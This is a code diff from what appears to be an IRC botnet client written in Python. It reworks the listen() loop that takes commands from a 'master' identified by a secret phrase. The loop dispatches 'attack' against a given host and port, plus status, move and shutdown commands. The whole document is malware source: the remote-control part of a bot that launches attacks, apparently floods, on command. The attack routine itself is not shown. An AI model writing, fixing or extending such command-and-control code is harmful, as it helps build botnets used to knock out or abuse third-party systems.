@@ -82,22 +82,33 @@ def move(hostname,port,channel):
 def listen():
     while True:
         indata = irc.recv(1024)
-        inmsg = indata.decode("utf-8").split(":")
+        inmsg = indata.decode("utf-8").split()
         print(inmsg)
         if 'PING' in inmsg[0]:
             ping(inmsg[1])
-        elif sphrase == (inmsg[2].split())[0]:
-            print ("serving master!")
-            if (inmsg[2].split())[1] == 'attack':
-                attack(inmsg[2].split()[2],inmsg[2].split()[3])
-            elif (inmsg[2].split())[1] == 'status':
-                status(inmsg[1].split("!")[0])
-            elif (inmsg[2].split())[1] == 'move':
-                pass
-            elif (inmsg[2].split())[1] == 'shutdown':
-                shutdown()
-        else:
-            print("what to do?")
+            continue
+        try:
+            masterName = inmsg[0].split("!")[0].replace(":","")
+
+            inPhrase = inmsg[3]
+            inCmd = inmsg[4]
+
+            if ":"+sphrase == inPhrase:
+                print ("serving master!")
+                if inCmd == 'attack':
+                    attack(inmsg[5],int(inmsg[6]))
+                elif inCmd == 'status':
+                    status(masterName)
+                elif inCmd == 'move':
+                    pass
+                elif inCmd == 'shutdown':
+                    shutdown()
+
+        except Exception as err:
+            print(err)
+            print("not a valid cmd")
+            continue
+
     return
 
 # main=========================================================================
